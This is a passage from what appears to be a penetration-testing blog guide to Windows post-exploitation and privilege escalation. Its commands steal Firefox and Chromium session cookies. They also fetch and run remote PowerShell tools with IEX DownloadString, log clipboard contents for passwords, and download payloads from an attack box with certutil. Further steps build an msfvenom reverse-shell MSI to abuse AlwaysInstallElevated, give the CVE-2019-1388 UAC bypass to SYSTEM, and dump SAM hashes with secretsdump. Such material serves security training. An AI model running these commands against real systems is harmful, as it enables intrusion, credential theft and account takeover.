<p>If the user is using Firefox, we can copy the cookies database with the following command:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="n">copy</span><span class="w"> </span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">APPDATA</span><span class="nx">\Mozilla\Firefox\Profiles\</span><span class="o">*.</span><span class="nf">default-release</span><span class="nx">\cookies.sqlite</span><span class="w"> </span><span class="o">.</span><span class="w">
</span></code></pre></div>

<p>Once download on our attack box, we can use <a href="https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py" rel="nofollow">cookieextractor.py</a> to extract the cookies from this database:</p>

<div class="highlight"><pre class="highlight shell"><code>cookieextractor <span class="nt">--dbpath</span> <span class="s2">"cookies.sqlite"</span> <span class="nt">--host</span> &lt;host site&gt; <span class="nt">--cookie</span> &lt;cookie to extract&gt;
</code></pre></div>

<p>Once extracted, all that is left is to add the cookie with any cookie editor extension for firefox and try to log on to the service.</p>

<p>Extracting cookies from Chromium browsers is slightly trickier as the cookie values are encrypted with Data Protection API (DPAPI). Tools like <a href="https://github.com/djhohnstein/SharpChromium" rel="nofollow">SharpChromium</a> are available for this purpose, and <a href="https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1" rel="nofollow">Invoke-SharpChromium</a> can be directly imported to spare us the need to compile the original repository, using reflection to load SharpChromium.</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># Load Invoke-SharpChromium:</span><span class="w">
</span><span class="n">IEX</span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="s1">'https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1'</span><span class="p">)</span><span class="w">

</span><span class="c"># Extract cookies from a specific domain.</span><span class="w">
</span><span class="n">Invoke-SharpChromium</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s2">"cookies &lt;domain name&gt;"</span><span class="w">

</span><span class="c"># If we get an error, we have to match Invoke-SharpChromium's</span><span class="w">
</span><span class="c"># expectations of finding the file in</span><span class="w">
</span><span class="c"># %LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies.</span><span class="w">
</span><span class="c"># If it's not there, copy the file so the script can find it:</span><span class="w">
</span><span class="n">copy</span><span class="w"> </span><span class="s2">"</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">LOCALAPPDATA</span><span class="s2">\&lt;Cookies directory path&gt;"</span><span class="w"> </span><span class="s2">"</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">LOCALAPPDATA</span><span class="s2">\Google\Chrome\User Data\Default\Cookies"</span><span class="w">
</span></code></pre></div>

<p>Another thing we can pillage is the clipboard&#39;s content, which will often contain credentials copied and pasted from password managers. We can use <a href="https://github.com/inguardians/Invoke-Clipboard/blob/master/Invoke-Clipboard.ps1" rel="nofollow">Invoke-Clipboard</a> for this:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="n">IEX</span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="s1">'https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1'</span><span class="p">)</span><span class="w">
</span><span class="nx">Invoke-ClipboardLogger</span><span class="w">
</span></code></pre></div>

<p>This will start to monitor the clipboard as long as we want.</p>

<p>Enumerating roles and services for further pillaging is also important. Services might serve an important purpose on our current host or other hosts on the network. Server roles might include:</p>

<ul>
<li>File and Print Servers</li>
<li>Web and Database Servers</li>
<li>Certificate Authority Servers</li>
<li>Source Code Management Servers</li>
<li>Backup Servers</li>
</ul>

<p>If we have access to a server or host with a backup system in place for instance, we might be able to make a backup with a Volume Shadow Copy (VSS), or restore sensitive files such as the SAM and SYSTEM hives.</p>

<h3>Leveraging additional techniques</h3>

<p>Living Off The Land Binaries and Scripts (LOLBAS) are binaries/libraries/scripts that are either found in Windows systems or are readily downloadable from Microsoft. They have unintended side effects that might escalate our privileges, more details can be found <a href="https://lolbas-project.github.io/" rel="nofollow">here</a>.</p>

<p>For instance, <code>certutil</code> is initially intended to handle certificates, but can be used to download files from remote hosts or encode / decode files in base64:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># Download file from attack box with certutil:</span><span class="w">
</span><span class="n">certutil.exe</span><span class="w"> </span><span class="nt">-urlcache</span><span class="w"> </span><span class="o">-split</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="nx">http://</span><span class="err">&lt;</span><span class="nx">attack</span><span class="w"> </span><span class="nx">box</span><span class="w"> </span><span class="nx">IP</span><span class="err">&gt;</span><span class="p">:</span><span class="err">&lt;</span><span class="nx">attack</span><span class="w"> </span><span class="nx">box</span><span class="w"> </span><span class="nx">port</span><span class="err">&gt;</span><span class="nx">/</span><span class="err">&lt;</span><span class="nx">filename</span><span class="err">&gt;</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">destination</span><span class="err">&gt;</span><span class="w">

</span><span class="c"># Encode file in base64:</span><span class="w">
</span><span class="n">certutil</span><span class="w"> </span><span class="nt">-encode</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">file</span><span class="err">&gt;</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">destination</span><span class="err">&gt;</span><span class="w">

</span><span class="c"># Decode file in base64:</span><span class="w">
</span><span class="n">certutil</span><span class="w"> </span><span class="nt">-encode</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">encoded</span><span class="w"> </span><span class="nx">file</span><span class="err">&gt;</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">destination</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div>

<p>Another LOLBAS is <code>rundll32.exe</code>, which can execute a DLL file. This could be used to execute a malicious DLL file to obtain a reverse shell.</p>

<p>Another technique we saw a glimpse off earlier is the <code>Always install with elevated privileges</code> local group policy. If this is enabled, we can escalate our privileges just by executing a malicious MSI package:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># Check if "Always install with elevated privileges"</span><span class="w">
</span><span class="c"># is enabled:</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</span><span class="w">
</span></code></pre></div><div class="highlight"><pre class="highlight shell"><code><span class="c"># On our attack box, generate a .msi executable with msfvenom:</span>
msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">lhost</span><span class="o">=</span>&lt;attack box IP&gt; <span class="nv">lport</span><span class="o">=</span>&lt;attack box port&gt; <span class="nt">-f</span> msi <span class="o">&gt;</span> hacky.msi
</code></pre></div><div class="highlight"><pre class="highlight powershell"><code><span class="c"># Once downloaded and with a listener on our attack box,</span><span class="w">
</span><span class="c"># execute the .msi package:</span><span class="w">
</span><span class="n">msiexec</span><span class="w"> </span><span class="nx">/i</span><span class="w"> </span><span class="nx">c:\</span><span class="err">&lt;</span><span class="nx">absolute</span><span class="w"> </span><span class="nx">path</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="o">.</span><span class="nf">msi</span><span class="w"> </span><span class="nx">executable</span><span class="err">&gt;</span><span class="nx">\hacky.msi</span><span class="w"> </span><span class="nx">/quiet</span><span class="w"> </span><span class="nx">/qn</span><span class="w"> </span><span class="nx">/norestart</span><span class="w">
</span></code></pre></div>

<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-1388" rel="nofollow">CVE-2019-1388</a> is another way to escalate our privileges. This leverages a vulnerability in the UAC prompt, where some executables might offer an option to show more info about the exeutable&#39;s certificate. The following steps can escalate our privileges:</p>

<ul>
<li>Find an executable that contains a certificate with a hyperlink. <code>hhupd.exe</code> is a common example.</li>
<li>Right-click on the executable and select <code>run as administrator</code> to start the UAC.</li>
<li>Click <code>Show information about the publisher&#39;s certificate</code>.</li>
<li>Click on <code>Details</code> tab and check that the <code>SpcSpAgencyInfo</code> is populated.</li>
<li>If it is, click on <code>General</code> tab and click on the <code>Issued by</code> hyperlink.</li>
<li>Click <code>OK</code> to close the certificate dialog and launch a browser window.</li>
<li>This browser instance will be launched as <code>SYSTEM</code>, as shown in task manager.</li>
<li>Right-click on web page and choose <code>view page source</code>.</li>
<li>Right-click again in the new tab and select <code>save as</code>.</li>
<li>Type <code>c:\windows\system32\</code> and hit enter to jump to the location.</li>
<li>Change the previous path by <code>*.*</code> and hit enter to show everything.</li>
<li>Select and run cmd.exe as <code>SYSTEM</code>.</li>
</ul>

<p>Behind the scenes, the hyperlink for the certificate is generated when the binary is signed with a certificate that has a <code>1.3.6.1.4.1.311.2.1.10</code> Object Identifier (OID). When present, this OID will be identified in the <code>wintrust.h</code> header as <code>SPC_SP_AGENCY_INFO_OBJID</code> and will render a hyperlink in the <code>General</code> tab.</p>

<p>A list of all vulnerable Windows servers and workstations can be found <a href="https://web.archive.org/web/20210620053630/https://gist.github.com/gentilkiwi/802c221c0731c06c22bb75650e884e5a" rel="nofollow">here</a>.</p>

<p>Scheduled tasks can also be improperly set and run as administrator, while the script being called is located in a folder writeable to all <code>BUILTIN\Users</code>. Thus, we could change the script with a payload to gain an elevated reverse shell, or add a user to the local admins group, etc.</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># Enumerate scheduled tasks with cmd.exe:</span><span class="w">
</span><span class="n">schtasks</span><span class="w"> </span><span class="nx">/query</span><span class="w"> </span><span class="nx">/fo</span><span class="w"> </span><span class="nx">LIST</span><span class="w"> </span><span class="nx">/v</span><span class="w">

</span><span class="c"># Enumerate scheduled tasks with powershell:</span><span class="w">
</span><span class="n">Get-ScheduledTask</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">TaskName</span><span class="p">,</span><span class="nx">State</span><span class="w">

</span><span class="c"># Check permissions of a directory containing</span><span class="w">
</span><span class="c"># scripts ran for scheduled tasks:</span><span class="w">
</span><span class="o">.</span><span class="n">\accesschk64.exe</span><span class="w"> </span><span class="nx">/accepteula</span><span class="w"> </span><span class="nt">-s</span><span class="w"> </span><span class="nt">-d</span><span class="w"> </span><span class="nx">C:\Scripts\</span><span class="w">
</span></code></pre></div>

<p>Sysadmins might store account details in a computer or user&#39;s account description field:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># Check local user description field:</span><span class="w">
</span><span class="n">Get-LocalUser</span><span class="w">

</span><span class="c"># Check computer description field:</span><span class="w">
</span><span class="n">Get-WmiObject</span><span class="w"> </span><span class="nt">-Class</span><span class="w"> </span><span class="nx">Win32_OperatingSystem</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">Description</span><span class="w">
</span></code></pre></div>

<p>If we found .vhd, .vhdx, or .vmdk files using a tool like <a href="https://github.com/SnaffCon/Snaffler" rel="nofollow">Snaffler</a>, this is also worth exploring. These files are virtual hard disks, and mounting them is equivalent to being logged into the host they&#39;re copying:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># Mount a VMDK on Linux, if we downloaded it locally:</span>
guestmount <span class="nt">-a</span> &lt;file name&gt;.vmdk <span class="nt">-i</span> <span class="nt">--ro</span> /mnt/vmdk

<span class="c"># Mount a VHD/VHDX on Linux:</span>
guestmount <span class="nt">--add</span> &lt;file name&gt;.vhdx  <span class="nt">--ro</span> /mnt/vhdx/ <span class="nt">-m</span> /dev/sda1
</code></pre></div>

<p>In Windows, we can simply right-click and select <code>Mount</code>, or use the <a href="https://learn.microsoft.com/en-us/powershell/module/hyper-v/mount-vhd?view=windowsserver2019-ps" rel="nofollow">Mount-VHD</a> powershell cmdlet:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="n">Mount-VHD</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nx">c:\</span><span class="err">&lt;</span><span class="nx">mount</span><span class="w"> </span><span class="nx">path</span><span class="err">&gt;</span><span class="nx">\</span><span class="err">&lt;</span><span class="nx">file</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="o">.</span><span class="nf">vhdx</span><span class="w">
</span></code></pre></div>

<p>For a .vmdk file in Windows, we can right-click and choose <code>Map virtual disk</code>, then select a drive letter. If this doesn&#39;t work, other methods are available <a href="https://www.nakivo.com/blog/extract-content-vmdk-files-step-step-guide/" rel="nofollow">here</a>, which include using 7zip.</p>

<p>Once this is done, we could check <code>C:\Windows\System32\Config</code> to download <code>SAM</code>, <code>SECURITY</code> and <code>SYSTEM</code> registry hives and extract the password hashes with <code>secretsdump.py</code>:</p>

<div class="highlight"><pre class="highlight shell"><code>secretsdump.py <span class="nt">-sam</span> SAM <span class="nt">-security</span> SECURITY <span class="nt">-system</span> SYSTEM LOCAL
</code></pre></div>

<h2>Dealing with old systems</h2>

<h3>Legacy OSes</h3>

<p>It&#39;s important to keep in mind additional flaws found in legacy systems, on top of those we explored in this document, as we will encounter such OSes in large environments.</p>

<p>When the support lifetime for a Windows product is over, security issues will not be fixed, making it a vulnerable target for us. Here is a list of products that has reached or will soon reach their end of life:</p>

<table><thead>
<tr>
<th>Product</th>
<th>EOL date</th>
</tr>
</thead><tbody>
<tr>
<td>Microsoft Office 2003</td>
<td>April 8, 2014</td>
</tr>
<tr>
<td>Microsoft Office 2007</td>
<td>October 10, 2017</td>
</tr>
<tr>
<td>Microsoft Office 2010</td>
<td>October 13, 2020</td>
</tr>
<tr>
<td>Microsoft Office 2011 for Mac</td>
<td>October 10, 2017</td>
</tr>
<tr>
<td>Microsoft Office 2013</td>
<td>April 11, 2023</td>
</tr>
<tr>
<td>Microsoft Office 2016</td>
<td>October 14, 2025</td>
</tr>
<tr>
<td>Microsoft Office 2016 for Mac</td>
<td>October 13, 2020</td>
</tr>
<tr>
<td>Microsoft Office 2019</td>
<td>October 14, 2025</td>
</tr>
<tr>
<td>Microsoft Office 2019 for Mac</td>
<td>October 10, 2023</td>
</tr>
<tr>
<td>Microsoft Office 2021</td>
<td>October 13, 2026</td>
</tr>
<tr>
<td>Microsoft Office 2021 for Mac</td>
<td>October 13, 2026</td>
</tr>
<tr>
<td>Microsoft Office 2024</td>
<td>October 9, 2029</td>
</tr>
<tr>
<td>Microsoft Office 2024 for Mac</td>
<td>October 9, 2029</td>
</tr>
<tr>
<td>Microsoft Publisher</td>
<td>October 13, 2026</td>
</tr>
<tr>
<td>Microsoft Windows XP</td>
<td>April 8, 2014</td>
</tr>
<tr>
<td>Microsoft Windows Vista</td>
<td>April 11, 2017</td>
</tr>
<tr>
<td>Microsoft Windows 7</td>
<td>January 14, 2020</td>
</tr>
<tr>
<td>Microsoft Windows 8</td>
<td>January 12, 2016</td>
</tr>
<tr>
<td>Microsoft Windows 8.1</td>
<td>January 10, 2023</td>
</tr>
<tr>
<td>Microsoft Windows 10 release 1507 from July 2015</td>
<td>May 9, 2017</td>
</tr>
<tr>
<td>Microsoft Windows 10 release 1511 from November 2015</td>
<td>October 10, 2017</td>
</tr>
<tr>
<td>Microsoft Windows 10 release 1607</td>
<td>April 10, 2018</td>
</tr>
<tr>
<td>Microsoft Windows 10 release 1703</td>
<td>October 9, 2018</td>
</tr>
<tr>
<td>Microsoft Windows 10 release 1709</td>
<td>April 9, 2019</td>
</tr>
<tr>
<td>Microsoft Windows 10 release 1803</td>
<td>November 12, 2019</td>
</tr>
<tr>
<td>Microsoft Windows 10 release 1809</td>
<td>November 10, 2020</td>
</tr>
<tr>
<td>Microsoft Windows 10 release 1903</td>
<td>December 8, 2020</td>
</tr>
<tr>
<td>Microsoft Windows 10 release 1909</td>
<td>May 11, 2021</td>
</tr>
<tr>
<td>Microsoft Windows 10 release 2004</td>
<td>December 14, 2021</td>
</tr>
<tr>
<td>Microsoft Windows 10 release 20H2</td>
<td>May 10, 2022</td>
</tr>
<tr>
<td>Microsoft Windows 10 release 21H1</td>
<td>December 13, 2022</td>
</tr>
<tr>
<td>Microsoft Windows 10 release 21H2</td>
<td>June 13, 2023</td>
</tr>
<tr>
<td>Microsoft Windows 10 release 22H2</td>
<td>May 14, 2024</td>
</tr>
<tr>
<td>Microsoft Windows 11 release 21H2</td>
<td>October 10, 2023</td>
</tr>
<tr>
<td>Microsoft Windows 11 release 22H2</td>
<td>October 14, 2024</td>
</tr>
<tr>
<td>Microsoft Windows 11 release 23H2</td>
<td>November 11, 2025</td>
</tr>
<tr>
<td>Microsoft Windows 11 release 24H2</td>
<td>October 13, 2026</td>
</tr>
<tr>
<td>Microsoft Edge Legacy Edition that came with Windows 10</td>
<td>March 9, 2021</td>
</tr>
<tr>
<td>Microsoft Internet Explorer</td>
<td>Removal June 13, 2023</td>
</tr>
<tr>
<td>Microsoft Windows Server 2003</td>
<td>July 14, 2015</td>
</tr>
<tr>
<td>Microsoft Windows Server 2003 R2</td>
<td>July 14, 2015</td>
</tr>
<tr>
<td>Microsoft Windows Server 2008</td>
<td>January 14, 2020</td>
</tr>
<tr>
<td>Microsoft Windows Server 2008 R2</td>
<td>January 14, 2020</td>
</tr>
<tr>
<td>Microsoft Windows Server 2012</td>
<td>October 10, 2023</td>
</tr>
<tr>
<td>Microsoft Windows Server 2012 R2</td>
<td>October 10, 2023</td>
</tr>
<tr>
<td>Microsoft Windows Server 2016</td>
<td>January 12, 2027</td>
</tr>
<tr>
<td>Microsoft Windows Server 2019</td>
<td>January 9, 2029</td>
</tr>
<tr>
<td>Microsoft Windows Server 2022</td>
<td>October 14, 2031</td>
</tr>
<tr>
<td>Microsoft Exchange Server 2003</td>
<td>April 8, 2014</td>
</tr>
<tr>
<td>Microsoft Exchange Server 2007</td>
<td>April 11, 2017</td>
</tr>
<tr>
<td>Microsoft Exchange Server 2010</td>
<td>October 13, 2020</td>
</tr>
<tr>
<td>Microsoft Exchange Server 2013</td>
<td>April 11, 2023</td>
</tr>
<tr>
<td>Microsoft Exchange Server 2016</td>
<td>October 14, 2025</td>
</tr>
<tr>
<td>Microsoft Exchange Server 2019</td>
<td>October 14, 2025</td>
</tr>
<tr>
<td>Microsoft SQL Server 2005</td>
<td>April 12, 2016</td>
</tr>
<tr>
<td>Microsoft SQL Server 2008</td>
<td>July 9, 2019</td>
</tr>
<tr>
<td>Microsoft SQL Server 2012</td>
<td>July 12, 2022</td>
</tr>
<tr>
<td>Microsoft SQL Server 2014</td>
<td>July 9, 2024</td>
</tr>
<tr>
<td>Microsoft SQL Server 2016</td>
<td>July 14, 2026</td>
</tr>
<tr>
<td>Microsoft SQL Server 2017</td>
<td>October 12, 2027</td>
</tr>
<tr>
<td>Microsoft SQL Server 2019</td>
<td>January 8, 2030</td>
</tr>
<tr>
<td>Microsoft SQL Server 2022</td>
<td>January 11, 2033</td>
</tr>
</tbody></table>

<p>More details about EOL dates can be found <a href="https://michaelspice.net/windows/end-of-life-microsoft-windows-and-office/" rel="nofollow">here</a>.</p>

<p>In organizations such as medical offices or local governments, retiring an EOL system might be impossible due to various constraints, so we must always keep an eye out for them. Network segmentation and isolation of these systems should be recommended to our client.</p>

<h3>Leveraging EOL Windows servers</h3>

<p>For older Windows servers such as Windows Server 2008, we can use <a href="https://github.com/rasta-mouse/Sherlock" rel="nofollow">Sherlock</a> to search for missing patches. <a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester" rel="nofollow">Windows-Exploit-Suggester</a> could also be useful.</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># Check for current patch level on target:</span><span class="w">
</span><span class="n">wmic</span><span class="w"> </span><span class="nx">qfe</span><span class="w">

</span><span class="c"># Bypass execution policy and use Sherlock:</span><span class="w">
</span><span class="n">Set-ExecutionPolicy</span><span class="w"> </span><span class="nx">bypass</span><span class="w"> </span><span class="nt">-Scope</span><span class="w"> </span><span class="nx">process</span><span class="w">
</span><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\Sherlock.ps1</span><span class="w">
</span><span class="n">Find-AllVulns</span><span class="w">
</span></code></pre></div>

<p>Depending on the result, we can then look for various exploits and PoCs who should be widely available given the age of this system.</p>

<h3>Leveraging EOL Windows desktops</h3>

<p>Windows 7 is still largely used in many organizations and is worth exploring, too. We can use Sherlock to enumerate missing patches just like with Windows servers, but let&#39;s see how to use windows-exploit-suggester:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># On our target, copy the output of systeminfo:</span><span class="w">
</span><span class="n">systeminfo</span><span class="w">
</span></code></pre></div><div class="highlight"><pre class="highlight shell"><code><span class="c"># Paste it in a file on our attack box, then</span>
<span class="c"># use windows-exploit-suggester against it.</span>
<span class="c"># First, get a local copy of the Microsoft</span>
<span class="c"># Vulnerability database:</span>
windows-exploit-suggester <span class="nt">--update</span>
<span class="c"># Then, run the tool with both systeminfo's output</span>
<span class="c"># and the database:</span>
windows-exploit-suggester <span class="nt">--database</span> &lt;database filename&gt; <span class="nt">--systeminfo</span> &lt;systeminfo filename&gt;
</code></pre></div>

<p>Depending on the output and the vulnerabilities found, various exploits and PoCs can be tried against our target, like the one for <a href="https://www.exploit-db.com/exploits/39719" rel="nofollow">MS16-032</a>.</p>

<h2>References</h2>

<ul>
<li><a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation" rel="nofollow">https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation</a></li>
<li><a href="https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#windows-version-and-configuration" rel="nofollow">https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#windows-version-and-configuration</a></li>
<li><a href="https://michaelspice.net/windows/end-of-life-microsoft-windows-and-office/" rel="nofollow">https://michaelspice.net/windows/end-of-life-microsoft-windows-and-office/</a></li>
</ul>

    
    </main>
    <footer id="footer">
      <div class="footer-section"><a href="/license/">CC BY-NC-SA 4.0</a><p>&nbsp;::&nbsp;2019 - 2025 ovelny</p></div>
      <div class="footer-section">「七転び八起き」</div>
    </footer>
  </body>
</html>

